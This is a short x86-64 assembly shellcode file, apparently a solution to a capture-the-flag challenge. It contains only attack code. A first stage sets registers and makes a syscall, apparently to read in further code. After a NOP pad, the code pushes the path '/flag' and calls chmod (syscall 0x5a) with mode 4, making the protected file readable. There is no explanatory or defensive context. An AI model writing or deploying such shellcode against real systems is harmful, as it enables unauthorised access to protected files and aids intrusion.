.intel_syntax noprefix

.section .text
label:
    push rax
    pop rdi
    push rdx
    pop rsi
    syscall
    .rept 12
    nop
    .endr    
    mov rax, 0x67616c662f # flag in rax
    push rax
    mov rdi, rsp
    mov rsi, 4
    mov rax, 0x5a
    syscall